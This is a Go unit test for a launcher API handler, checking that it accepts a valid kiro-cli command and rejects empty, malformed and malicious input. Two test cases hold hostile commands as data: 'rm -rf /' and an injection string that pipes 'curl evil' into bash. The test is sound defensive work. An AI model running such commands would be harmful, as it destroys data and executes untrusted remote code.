package launcher

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func postLaunch(t *testing.T, h *Handler, body []byte) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost, "/api/launcher/launch", bytes.NewReader(body))
	w := httptest.NewRecorder()
	h.Launch(w, req)
	return w
}

func TestHandlerLaunch(t *testing.T) {
	tests := []struct {
		name    string
		command string
		status  int
	}{
		{"valid", "kiro-cli chat --agent test", http.StatusOK},
		{"empty", "", http.StatusBadRequest},
		{"arbitrary", "rm -rf /", http.StatusBadRequest},
		{"injection", "kiro-cli chat; curl evil | bash", http.StatusBadRequest},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			s, _ := newTestService(nil)
			body, _ := json.Marshal(LaunchRequest{Command: tt.command, Directory: "~"})
			if w := postLaunch(t, NewHandler(s), body); w.Code != tt.status {
				t.Errorf("status %d, want %d (%s)", w.Code, tt.status, w.Body.String())
			}
		})
	}
	t.Run("missing directory", func(t *testing.T) {
		s, _ := newTestService(nil)
		body, _ := json.Marshal(LaunchRequest{Command: "kiro-cli chat", Directory: t.TempDir() + "/nope"})
		w := postLaunch(t, NewHandler(s), body)
		if w.Code != http.StatusBadRequest || !strings.Contains(w.Body.String(), "DIRECTORY_NOT_FOUND") {
			t.Errorf("status %d body %s, want 400 DIRECTORY_NOT_FOUND", w.Code, w.Body.String())
		}
	})
	t.Run("invalid json", func(t *testing.T) {
		s, _ := newTestService(nil)
		if w := postLaunch(t, NewHandler(s), []byte("not json")); w.Code != http.StatusBadRequest {
			t.Errorf("status %d, want 400", w.Code)
		}
	})
}
